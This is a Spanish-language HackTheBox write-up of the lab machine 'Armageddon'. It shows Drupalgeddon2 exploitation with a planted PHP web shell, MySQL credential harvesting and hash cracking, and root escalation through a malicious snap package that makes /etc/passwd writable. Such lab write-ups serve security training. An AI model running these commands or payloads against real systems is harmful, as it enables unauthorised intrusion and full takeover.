---
title: "Armageddon - HTB Writeup"
layout: single
excerpt: "Armageddon es una máquina de nivel fácil de HackTheBox. En esta maquina nos aprovechamos de una vulnerabilidad del gestor de contenidos Drupal. Para la escalada de privilegios nos aprovechamos de un permiso de sudoers que nos permite ejecutar snap como superusuario, creamos un paquete de instalacion malicioso y conseguimos convertirnos en root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/127016657-1819f034-bc50-424e-a8b9-e6ae1513de24.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - mysql
  - Drupal
  - snap
---

![titulo](https://user-images.githubusercontent.com/67548295/127016915-5c9e247d-51bd-4b60-80f0-3f7a738782f6.png)

# Enumeración

Antes de empezar a enumerar servicios y puertos, comienzo enviando una traza ICMP a la máquina para ver si está activa:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.233 
PING 10.10.10.233 (10.10.10.233) 56(84) bytes of data.
64 bytes from 10.10.10.233: icmp_seq=1 ttl=63 time=68.6 ms

--- 10.10.10.233 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 68.585/68.585/68.585/0.000 ms
```
Como podemos ver, la máquina nos ha respondido, eso quiere decir que está activa.

También, mirando el valor del TTL puedo deducir que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

# Nmap

Empezamos la fase de enumeración de puertos haciendo uso de la herramienta ```nmap```:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- -sS --min-rate 4000 -n -v --reason --open 10.10.10.233 -sC -sV -oN targeted

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 16:44 WEST

[...]

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 \((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.24 seconds
           Raw packets sent: 65635 (2.888MB) | Rcvd: 65632 (2.625MB)
```

Podemos ver que tenemos el puerto 22 y 80 abiertos, que corresponden a SSH y HTTP.

Empezaremos enumerando el HTTP, y ya podemos ver que nmap ha detectado que hay ejecutandose un CMS Drupal 7, una version un poco antigua

# User.txt

Visito el servidor web con el navegador y me encuentro esto: 

![navegador1](https://user-images.githubusercontent.com/67548295/127019816-1c7df4a5-f91f-47e3-a458-bba19a47fbae.png)

Vemos que hay un panel de inicio de sesión, pero tras intentar iniciar sesion con credenciales comunes e intentar crear una cuenta, ambas me dieron error.

Lo siguiente que hice fue con searchsploit buscar vulnerabilidades asociadas con la versión de Drupal a la que me estaba enfrentando:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Armageddon/exploits]
└──╼ $searchsploit Drupal 7
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                    | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                            | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                              | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                            | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                  | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                   | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                        | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                         | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                              | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                              | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                 | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                   | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                       | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                  | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                    | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                            | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                                                        | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                                                                                                        | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                 | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                              | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                      | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                      | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                         | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                    | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                           | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                       | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                        | php/webapps/44501.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                   | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                          | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                            | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                  | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                           | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                             | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                        | php/remote/40130.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Hay varios exploits con nombre _Drupalgeddon_, busco un exploit con nombre drupalgeddon en github y al ejecutarlo conseguimos ejecutar comandos:

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~/CTF/HTB/Armageddon/exploits]
└──╼ $ruby drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isnt an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo GXIEPEGU
[+] Result : GXIEPEGU
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> whoami
apache
```

Utilicé este [exploit](https://github.com/dreadlocked/Drupalgeddon2){:target="\_blank"}{:rel="noopener nofollow"} para llevar a cabo este RCE.

Despues de esto, hago una reverse shell para tener una full TTY mas cómoda que la que me daba el exploit y ganamos acceso:

```bash

sh-4.2$ whoami

apache
```
Una vez estamos como el usuario apache empezamos a enumerar el sistema.

Tras buscar archivos de configuracion en /var/www/html en busca de credenciales, me encuentro con que el archivo /var/www/html/sites/default/settings.php
contiene credenciales para acceder a mysql:

```text

[...]

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'XXXXXXXXXXXX',
      'password' => 'XXXXXXXXXXXXXXX',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

[...]

```
Pruebo a conectarme al servicio mysql con las credenciales encontradas y son válidas: 

```bash
sh-4.2$ mysql -h localhost -uXXXXXXXXXX -pCXXXXXXXXXXXX -e "show databases;"
                      
Database
information_schema
drupal
mysql
performance_schema
```
Busco por credenciales en la base de datos drupal y consigo unas:

```bash

sh-4.2$ mysql -h localhost -uXXXXXXXXX -pXXXXXXXXXXXXXXX -D drupal -e "select name,pass from users;"

name	pass
	
bruXXXXXXXXXXin	$S$DgLXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXRt

```

Pruebo a crackear el hash con john y lo consigo:

```bash

┌──[z3r0byte@z3r0byte]─[~/CTF/HTB/Armageddon/content]
└──╼ $hashcat -a 0 -m 7900 hash /home/z3r0byte/wordlists/rockyou.txt

[...]

$S$DgLXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXRt:XXXXXXXX

[...]

```

pruebo a conectarme por SSH con las credenciales que tengo y tengo exito:

```bash

[brucetherealadmin@armageddon ~]$ ifconfig | grep "inet 10"

        inet 10.10.10.233  netmask 255.255.255.0  broadcast 10.10.10.255
```

A partir de aqui ya podriamos ver la flag user.txt:

```bash

[brucetherealadmin@armageddon ~]$ cat user.txt 

e46XXXXXXXXXXXXXXXXXXXXXXXX001

```
# root.txt

Enumero el sistema para ver si hay algun vector para escalar privilegios y me encuentro con que podemos paquetes de forma privilegiada con snap:

```bash

[brucetherealadmin@armageddon ~]$ sudo -l

Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
    
```

Busco en [GTFObins](https://gtfobins.github.io/){:target="\_blank"}{:rel="noopener nofollow"} y veo que podemos aprovecharnos de esto para escalar privilegios:

![navegador2](https://user-images.githubusercontent.com/67548295/127034345-c55f19eb-cfc5-401c-a716-1c5fbc7ed0e4.png)

Sigo los pasos en mi maquina para compilar el paquete de instalacion malicioso y lo transfiero a la maquina victima.

Lo ejecuto con los permisos de sudoers habilitados para mi usuario y consigo instalarlo

En este caso yo puse un comando para asignarle permisos full a /etc/passwd para poder sustituir la password de root

Una vez hecho esto podemos convertirnos en el usuario root y ver la flag root.txt:

```
[brucetherealadmin@armageddon tmp]$ curl http://10.10.14.169/xxxx_1.0_all.snap -o xxxx_1.0_all.snap

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  27181      0 --:--:-- --:--:-- --:--:-- 27489

[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode

error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": exit status 1)

[brucetherealadmin@armageddon tmp]$ ls -lah /etc/passwd
-rwxrwxrwx. 1 root root 974 jul 26 19:05 /etc/passwd

[brucetherealadmin@armageddon tmp]$ openssl passwd
Password: 
Verifying - Password: 
9HPZiB7Ar5uZM

[brucetherealadmin@armageddon tmp]$ vi /etc/passwd

[brucetherealadmin@armageddon tmp]$ su root
Contraseña: 

[root@armageddon tmp]# cat /root/root.txt 
5f8389XXXXXXXXXXXXXXXXXXXXXXXXX12
```

Sustituí en el /etc/passwd la "x" del usuario root por una contraseña que genere con openssl, para asi poder convertirme en usuario root.

Mas información sobre esto [aqui](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/){:target="\_blank"}{:rel="noopener nofollow"}

